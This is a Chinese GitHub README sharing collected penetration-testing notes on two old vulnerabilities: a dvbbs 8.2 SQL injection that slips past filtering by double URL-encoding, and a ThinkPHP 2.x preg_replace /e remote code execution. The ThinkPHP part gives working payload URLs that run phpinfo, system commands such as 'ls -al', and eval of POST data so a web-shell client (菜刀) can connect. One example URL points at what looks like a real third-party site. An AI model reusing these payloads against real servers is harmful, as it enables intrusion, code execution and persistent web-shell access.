# Permeable
## 很早以前收集的渗透资料，现在分享一下
## 点个小星星呗～


分享请注明来源～
https://github.com/w1109790800/Permeable


### 下面是几个文件的具体内容:
#### dvbbs 8.2 SQL注射漏洞分析

[dvbbs 8.2 SQL注射漏洞分析 全文]漏洞公告:http://seclists.org/bugtraq/2008/May/0330.html

利用方式:一个典型的sql注射漏洞,按照公告里说的用

password=123123&codestr=71&CookieDate=2&userhidden=2&comeurl=index.asp&submit=%u7ACB%u5373%u767B%u5F55&ajaxPost=1&am 

漏洞分析:动网在asp领域也算一个比较元老的程序,这次在8.2新版里有一个低级的错误.漏洞代码在login.asp 118行左右 

...... 

username=trim(Dvbbs.CheckStr(request("username"))) 

If ajaxPro Then username = unescape(username) 

...... 

取得的username是先经过检查然后再unescape解码,导致用urlencode模式就可以饶过任何检查,和php的urldecode导致的注射很类似,譬如用%2527就可以提交’过去了. 




#### ThinkPHP 漏洞

2.0版本 /ThinkPHP/Lib/Think/Util/Dispatcher.class.php

2.1版本/ThinkPHP/Lib/Core/Dispatcher.class.php

搜索preg_replace 有一段替换使用了/e模式, 而且thinkphp底层没有提供参数的过滤， 这边就直接崩溃了。

测试代码

/index.php/Module/Action/Param/${@phpinfo()}

http://www.js.10086.cn/wxcs/ppo/YC/index.php/Public/MedInsurance/1/%7B$%7Bphpinfo()%7D%7D

/admin//index.php/public/login

去掉login 版本信息出来

最近thinkphp框架爆出了一个任意代码执行漏洞，其威胁程序相当的高,漏洞利用方法如下：

index.php/module/aciton/param1/${@print(THINK_VERSION)}index.php

/module/aciton/param1/${@function_all()}

其中function_all代表任何函数，

比如:index.php/module/aciton/param1/${@phpinfo()}

获取服务器的系统配置信息等。

index.php/module/action/param1/{${system($_GET['x'])}}?x=ls -al

列出网站文件列表

index.php/module/action/param1/{${eval($_POST[s])}}

直接执行一句话代码，用菜刀直接连接.

